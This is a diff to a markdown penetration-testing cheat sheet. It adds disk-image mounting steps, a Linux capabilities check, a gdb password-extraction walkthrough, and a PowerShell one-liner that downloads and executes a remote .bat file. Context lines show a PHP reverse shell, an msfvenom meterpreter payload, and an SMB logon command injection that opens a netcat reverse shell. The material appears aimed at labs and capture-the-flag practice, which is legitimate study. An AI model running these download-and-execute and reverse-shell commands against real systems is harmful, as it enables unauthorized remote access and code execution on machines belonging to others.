@@ -15,17 +15,62 @@
 13. [Linux Privilege Escalation](#linux-privilege-escalation)
 14. [SMTP](#smtp)
 15. [DNS](#dns)
-16. [SSH](#ssh)
+16. [SSH](#SSH)
 17. [Word Press](#word-press)
 18. [Reverse Shells](#reverse-shells)
 19. [RSA](#rsa)
 20. [SSL](#ssl)
 21. [Shell Shock](#shell-shock)
 22. [SMB](#smb)
+23. [Reverse Engineering](#Reverse Engineering)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
 # Misc
+
+## System Images
+### Convert to raw
+```
+qemu-img convert vm.qcow2 vm.raw
+```
+### Get info
+```
+mmls vm.raw
+sudo fdisk -l vm.raw
+fsstat -o 2048 vm.raw
+sudo sfdisk -d vm.raw
+```
+### Get offset and sizelimit
+* run sfdisk -d vm.raw
+* sample output:
+```
+[sudo] password for kali: 
+label: dos
+label-id: 0x50811ac7
+device: vm.raw
+unit: sectors
+sector-size: 512
+
+vm.raw1 : start=        2048, size=       36864, type=83, bootable
+vm.raw2 : start=       38912, size=      233472, type=83
+```
+* calculate offset and sizelimit
+```
+echo $((2048 * 512)) $((36864 * 512))
+```
+* mount image
+```
+sudo mount -o ro,offset=1048576,sizelimit=18874368 vm.raw /media/image
+```
+* boot image using QEMU (Quick Emulator)
+```
+# install dependencies
+apt install qemu qemu-kvm
+# boot
+qemu-system-x86_64 vm.raw -m 1024 # -m for specifying RAM
+```
+
+
 
 ## Log commands into file
 ```bash
@@ -574,6 +619,10 @@ netsh firewall show config
 
 
 # Linux Privilege Escalation
+## Get Capabilities
+```
+/sbin/getcap -r / 2>/dev/null
+```
 ## LinEnum
 Download [LinEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) and run it on victim's machine. 
 
@@ -680,6 +729,11 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ```bash
 msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw > shell.php
+```
+
+## Windows
+```
+powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
 ```
 
 # RSA
@@ -855,7 +909,19 @@ smbclient //10.10.10.3/tmp
 smb: \> logon "/=`nohup mkfifo /tmp/manununu; nc 10.10.14.41 2222 0</tmp/manununu | /bin/sh >/tmp/manununu 2>&1; rm /tmp/manununu`"
 ```
 
+# Reverse Engineering
+Example: Binary which prompting for a password. 
+1. gdb --args ./holly.bin asdf
+2. disassemble main
+3. search for str -> copy address and set breakpoint: # most likely a strcmp function or smth. similar
+4. b *0x0000000000400d9d 
+5. info registers
+6. (gdb) x/s $rsi
+7. 0x7fffffffdeb0: "holly-likes-alotta-crackas!"
+8. (gdb) x/s $rdi
+9. 0x7fffffffe33a: "asdf"
 
+There is also a nice gdb plugin called [peda](https://github.com/longld/peda)
 
 
 
